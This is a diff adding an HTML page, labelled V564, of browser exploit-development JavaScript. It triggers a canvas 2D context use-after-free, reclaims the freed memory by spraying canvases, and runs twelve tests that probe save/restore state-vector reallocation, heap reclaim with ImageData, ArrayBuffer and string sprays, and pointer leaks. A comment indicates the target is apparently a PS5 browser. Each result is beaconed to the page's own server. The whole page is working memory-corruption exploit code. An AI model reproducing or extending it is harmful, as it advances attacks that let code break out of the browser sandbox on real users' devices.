@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V564</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V564-'+tag+'?d='+encodeURIComponent(String(data).substring(0,600))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+b('BOOT','V564-statestack-leak');
+
+// === CANVAS UAF + MASS RECLAIM (from V562, proven) ===
+var uafResult=null;
+var reclaimResult=null;
+var aliasCtx=null;
+var aliasCvs=null;
+
+function triggerUAF(){
+  var c=document.createElement('canvas');c.width=10;c.height=10;
+  var stolen=null;
+  var ctx=c.getContext('2d',{get willReadFrequently(){
+    stolen=c.getContext('2d');return false;
+  }});
+  return {ctx:ctx,stolen:stolen,canvas:c};
+}
+
+function massReclaim(rows,cols){
+  var canvases=[];var contexts=[];
+  for(var i=0;i<rows*cols;i++){
+    var cv=document.createElement('canvas');cv.width=10;cv.height=10;
+    canvases.push(cv);
+    contexts.push(cv.getContext('2d'));
+  }
+  return {canvases:canvases,contexts:contexts};
+}
+
+function lightGC(){
+  var a=[];for(var i=0;i<5000;i++)a.push({x:i});a=null;
+}
+
+// Single UAF — 200 contexts (proven in V560-V562)
+var u=triggerUAF();
+var r=massReclaim(20,10);
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+b('SETUP','aliasIdx='+idx+'|lw='+lw);
+
+if(idx<0||idx>=200){
+  b('FAIL','alias-not-found|lw='+lw+'|idx='+idx);
+  // Reload after 3s to retry
+  setTimeout(function(){location.reload()},3000);
+  throw new Error('STOP');
+}
+
+// Null dangling + GC safe
+u.ctx=null;u=null;
+lightGC();
+
+aliasCtx=r.contexts[idx];
+aliasCvs=r.canvases[idx];
+
+// Verify alias
+aliasCtx.lineWidth=777;
+var readBack=aliasCtx.lineWidth;
+b('VERIFY','lw='+readBack+'|ok='+(readBack===777));
+
+if(readBack!==777){
+  b('FAIL','verify-mismatch|lw='+readBack);
+  setTimeout(function(){location.reload()},3000);
+  throw new Error('STOP');
+}
+
+// === T1: Read ALL float properties as raw doubles — look for pointer-like values ===
+(function(){
+  // Reset to defaults first
+  aliasCtx.lineWidth=1;
+  aliasCtx.miterLimit=10;
+  aliasCtx.globalAlpha=1;
+  aliasCtx.lineDashOffset=0;
+  aliasCtx.shadowBlur=0;
+  aliasCtx.shadowOffsetX=0;
+  aliasCtx.shadowOffsetY=0;
+
+  // Now read them all back — any non-default value is suspicious
+  var props={
+    lineWidth:aliasCtx.lineWidth,
+    miterLimit:aliasCtx.miterLimit,
+    globalAlpha:aliasCtx.globalAlpha,
+    lineDashOffset:aliasCtx.lineDashOffset,
+    shadowBlur:aliasCtx.shadowBlur,
+    shadowOffsetX:aliasCtx.shadowOffsetX,
+    shadowOffsetY:aliasCtx.shadowOffsetY
+  };
+  var parts=[];
+  for(var k in props) parts.push(k+'='+props[k]);
+  b('T1-DEFAULTS',parts.join('|'));
+})();
+
+// === T2: Set gradient as fillStyle, then read float properties ===
+// The gradient pointer lives in State struct — do floats shift?
+(function(){
+  var grad=aliasCtx.createLinearGradient(0,0,10,10);
+  grad.addColorStop(0,'red');
+  grad.addColorStop(1,'blue');
+  aliasCtx.fillStyle=grad;
+
+  // Read ALL float properties after setting gradient
+  var props={
+    lineWidth:aliasCtx.lineWidth,
+    miterLimit:aliasCtx.miterLimit,
+    globalAlpha:aliasCtx.globalAlpha,
+    lineDashOffset:aliasCtx.lineDashOffset,
+    shadowBlur:aliasCtx.shadowBlur,
+    shadowOffsetX:aliasCtx.shadowOffsetX,
+    shadowOffsetY:aliasCtx.shadowOffsetY
+  };
+  var parts=[];
+  for(var k in props) parts.push(k+'='+props[k]);
+  b('T2-POST-GRAD',parts.join('|'));
+
+  // Also check fillStyle readback
+  b('T2-FILL','fillStyle='+(typeof aliasCtx.fillStyle)+'|val='+aliasCtx.fillStyle);
+})();
+
+// === T3: save() counting — how many saves before vector realloc? ===
+(function(){
+  try{
+    // Set known state
+    aliasCtx.lineWidth=111;
+    aliasCtx.fillStyle='#ff0000';
+
+    var grad=aliasCtx.createLinearGradient(0,0,100,100);
+    grad.addColorStop(0,'#00ff00');
+    grad.addColorStop(1,'#0000ff');
+
+    // Progressive saves — report lineWidth after each
+    var results=[];
+    for(var i=0;i<20;i++){
+      aliasCtx.save();
+      aliasCtx.lineWidth=200+i;
+      // Set gradient every other save to populate RefPtr in State
+      if(i%2===0) aliasCtx.fillStyle=grad;
+      else aliasCtx.fillStyle='#'+(0x100000+i*0x010101).toString(16).slice(1);
+      results.push('s'+i+'='+aliasCtx.lineWidth);
+    }
+    b('T3-SAVES',results.join('|'));
+
+    // Now restore all — read lineWidth at each level
+    var restoreResults=[];
+    for(var i=19;i>=0;i--){
+      aliasCtx.restore();
+      restoreResults.push('r'+i+'='+aliasCtx.lineWidth);
+    }
+    b('T3-RESTORES',restoreResults.join('|'));
+
+    // Final restore should give original lineWidth=111
+    b('T3-FINAL','lw='+aliasCtx.lineWidth);
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// === T4: save() then read shadowColor — string property that holds pointer ===
+(function(){
+  try{
+    aliasCtx.shadowColor='rgba(171,205,239,0.5)';
+    aliasCtx.save();
+    var sc=aliasCtx.shadowColor;
+    aliasCtx.restore();
+    b('T4-SHADOW','shadowColor='+sc+'|type='+(typeof sc));
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// === T5: font property — another string/pointer in State ===
+(function(){
+  try{
+    aliasCtx.font='20px serif';
+    var f1=aliasCtx.font;
+    aliasCtx.save();
+    aliasCtx.font='30px sans-serif';
+    var f2=aliasCtx.font;
+    aliasCtx.restore();
+    var f3=aliasCtx.font;
+    b('T5-FONT','before='+f1+'|inner='+f2+'|after='+f3);
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// === T6: Measure state struct size via save() memory pressure ===
+// Each save() copies ~one State struct. Count how many before OOM-like behavior
+(function(){
+  try{
+    var count=0;
+    var startLW=aliasCtx.lineWidth;
+    try{
+      for(var i=0;i<500;i++){
+        aliasCtx.save();
+        aliasCtx.lineWidth=300+i;
+        count++;
+      }
+    }catch(e){
+      b('T6-OOM','crashed at save #'+count+': '+e.message);
+    }
+    b('T6-SAVES','saved='+count+'|lw='+aliasCtx.lineWidth);
+    // Restore all
+    for(var i=0;i<count;i++) aliasCtx.restore();
+    b('T6-RESTORED','lw='+aliasCtx.lineWidth+'|expected='+startLW);
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// === T7: Double interpretation of float fields ===
+// Write a known bit pattern as lineWidth, read back as float
+// This tests if we're truly accessing the raw memory
+(function(){
+  try{
+    // Write NaN-like value
+    aliasCtx.lineWidth=1/0; // Infinity
+    var r1=aliasCtx.lineWidth;
+
+    aliasCtx.lineWidth=-1/0; // -Infinity
+    var r2=aliasCtx.lineWidth;
+
+    aliasCtx.lineWidth=NaN;
+    var r3=aliasCtx.lineWidth;
+
+    // Write very large double
+    aliasCtx.lineWidth=1.7976931348623157e+308;
+    var r4=aliasCtx.lineWidth;
+
+    // Write very small positive
+    aliasCtx.lineWidth=5e-324;
+    var r5=aliasCtx.lineWidth;
+
+    // Write value that encodes a pointer-like bit pattern
+    // 0x000000082XXXXXXX as float64 — create via DataView
+    var ab=new ArrayBuffer(8);
+    var dv=new DataView(ab);
+    var f64=new Float64Array(ab);
+    dv.setUint32(0,0x41414141,true); // low 32
+    dv.setUint32(4,0x00000008,true); // high 32 — typical PS5 userland prefix
+    var ptrAsDouble=f64[0];
+    aliasCtx.lineWidth=ptrAsDouble;
+    var r6=aliasCtx.lineWidth;
+
+    b('T7-SPECIAL','inf='+r1+'|-inf='+r2+'|nan='+r3+'|max='+r4+'|min='+r5+'|ptr='+r6+'|ptrOrig='+ptrAsDouble);
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// === T8: ImageData sized to same class as state vector buffer ===
+// Vector of 16 States: if State~=256B, buffer~=4096B. ImageData(32,32) = 4096B.
+(function(){
+  try{
+    // Set up gradient in state
+    var grad=aliasCtx.createLinearGradient(0,0,1,1);
+    grad.addColorStop(0,'#abcdef');grad.addColorStop(1,'#123456');
+    aliasCtx.fillStyle=grad;
+    aliasCtx.font='italic 24px monospace';
+    aliasCtx.shadowColor='rgba(11,22,33,0.44)';
+
+    // save 16x to fill vector
+    for(var i=0;i<16;i++){
+      aliasCtx.save();
+      aliasCtx.lineWidth=400+i;
+    }
+    // One more save to trigger realloc
+    aliasCtx.save();
+    aliasCtx.lineWidth=999;
+
+    // Now try to reclaim freed vector buffer with ImageData
+    var imgs=[];
+    for(var i=0;i<50;i++){
+      try{
+        // Try various sizes for the freed buffer
+        imgs.push(aliasCtx.createImageData(32,32)); // 4096 bytes
+        imgs.push(aliasCtx.createImageData(64,16)); // 4096 bytes
+        imgs.push(aliasCtx.createImageData(16,16)); // 1024 bytes
+        imgs.push(aliasCtx.createImageData(48,48)); // 9216 bytes
+      }catch(e){break}
+    }
+
+    // Scan ImageData buffers for non-zero values (leaked pointer data)
+    var leaks=[];
+    for(var i=0;i<imgs.length;i++){
+      var d=imgs[i].data;
+      var nonZero=0;
+      for(var j=0;j<d.length;j++){
+        if(d[j]!==0){nonZero++;if(nonZero<=4)leaks.push('img'+i+'['+j+']='+d[j])}
+      }
+      if(nonZero>0) leaks.push('img'+i+':nz='+nonZero);
+    }
+    b('T8-IMAGEDATA','imgs='+imgs.length+'|leaks='+leaks.length+'|'+(leaks.length?leaks.join(','):'clean'));
+
+    // Restore all
+    for(var i=0;i<17;i++) aliasCtx.restore();
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+// === T9: ArrayBuffer spray after save realloc ===
+// AB is zero-init, but let's confirm the freed buffer exists in same heap
+(function(){
+  try{
+    var grad=aliasCtx.createLinearGradient(0,0,1,1);
+    grad.addColorStop(0,'#dead00');grad.addColorStop(1,'#beef00');
+    aliasCtx.fillStyle=grad;
+
+    // 8 saves
+    for(var i=0;i<8;i++){
+      aliasCtx.save();
+      aliasCtx.lineWidth=500+i;
+    }
+    // Trigger realloc
+    aliasCtx.save();
+
+    // Spray ABs of various sizes
+    var abs=[];
+    var sizes=[256,512,1024,2048,4096,8192];
+    for(var s=0;s<sizes.length;s++){
+      for(var i=0;i<20;i++){
+        abs.push(new ArrayBuffer(sizes[s]));
+      }
+    }
+
+    // Check: are ABs truly zeroed?
+    var nonZero=0;
+    for(var i=0;i<abs.length;i++){
+      var u8=new Uint8Array(abs[i]);
+      for(var j=0;j<u8.length;j++){
+        if(u8[j]!==0){nonZero++;break}
+      }
+    }
+    b('T9-ABSPRAY','total='+abs.length+'|nonZeroBuffers='+nonZero);
+
+    // Restore all
+    for(var i=0;i<9;i++) aliasCtx.restore();
+  }catch(e){b('T9','ERR:'+e.message)}
+})();
+
+// === T10: String allocation after save realloc ===
+// Strings use FastMalloc (same heap) and DON'T zero-init
+(function(){
+  try{
+    var grad=aliasCtx.createLinearGradient(0,0,1,1);
+    grad.addColorStop(0,'#cafe00');grad.addColorStop(1,'#babe00');
+    aliasCtx.fillStyle=grad;
+    aliasCtx.font='bold 48px serif';
+    aliasCtx.shadowColor='rgba(99,88,77,0.66)';
+
+    // 16 saves to fill state with pointers
+    for(var i=0;i<16;i++){
+      aliasCtx.save();
+      aliasCtx.lineWidth=600+i;
+    }
+    // Realloc trigger
+    aliasCtx.save();
+
+    // Spray strings of various sizes to try to reclaim freed vector buffer
+    var strs=[];
+    for(var i=0;i<200;i++){
+      // Create strings of sizes matching possible vector buffer sizes
+      strs.push('A'.repeat(256+i));
+      strs.push('B'.repeat(1024+i));
+      strs.push('C'.repeat(4096+i));
+    }
+
+    // We can't read raw string memory from JS, but we can check if
+    // the context state was corrupted by reading lineWidth
+    var currentLW=aliasCtx.lineWidth;
+    b('T10-STRINGS','lw='+currentLW+'|expected=616|match='+(currentLW===616));
+
+    // Restore and check integrity
+    aliasCtx.restore();
+    var afterRestore=aliasCtx.lineWidth;
+    b('T10-RESTORE','lw='+afterRestore+'|expected=615');
+
+    // Full restore
+    for(var i=0;i<16;i++) aliasCtx.restore();
+    b('T10-FINAL','lw='+aliasCtx.lineWidth);
+  }catch(e){b('T10','ERR:'+e.message)}
+})();
+
+// === T11: Cross-read between two alias canvases ===
+// Draw gradient on alias, getImageData — pixels contain gradient rendering
+// The gradient object pointer in State determines which gradient is drawn
+(function(){
+  try{
+    aliasCvs.width=64;aliasCvs.height=1;
+    var grad=aliasCtx.createLinearGradient(0,0,64,0);
+    grad.addColorStop(0,'#ff0000');
+    grad.addColorStop(0.5,'#00ff00');
+    grad.addColorStop(1,'#0000ff');
+    aliasCtx.fillStyle=grad;
+    aliasCtx.fillRect(0,0,64,1);
+    var id=aliasCtx.getImageData(0,0,64,1);
+    // Sample at 0, 16, 32, 48, 63
+    var samples=[];
+    for(var i of [0,16,32,48,63]){
+      var off=i*4;
+      samples.push('px'+i+'=R'+id.data[off]+'G'+id.data[off+1]+'B'+id.data[off+2]);
+    }
+    b('T11-GRADIENT',samples.join('|'));
+  }catch(e){b('T11','ERR:'+e.message)}
+})();
+
+// === T12: Detect State struct size via lineWidth at different save depths ===
+// Write distinct values at each depth, verify all preserved
+(function(){
+  try{
+    var depths=[1,2,4,8,16,17,32,33,64,65];
+    var maxDepth=depths[depths.length-1];
+    var saved=[];
+    for(var i=0;i<maxDepth;i++){
+      aliasCtx.save();
+      aliasCtx.lineWidth=700+i;
+      saved.push(700+i);
+    }
+    // Read at max depth
+    b('T12-TOP','depth='+maxDepth+'|lw='+aliasCtx.lineWidth+'|expected='+(700+maxDepth-1));
+    // Restore and check at key depths
+    var checks=[];
+    for(var i=maxDepth-1;i>=0;i--){
+      aliasCtx.restore();
+      if(depths.indexOf(i+1)!==-1||i===0){
+        checks.push('d'+(i)+'='+aliasCtx.lineWidth+'|ex='+saved[i-1 >= 0 ? i-1 : 0]);
+      }
+    }
+    b('T12-DEPTHS',checks.join(','));
+  }catch(e){b('T12','ERR:'+e.message)}
+})();
+
+b('DONE','V564-all-complete');
+</script>
+</body></html>
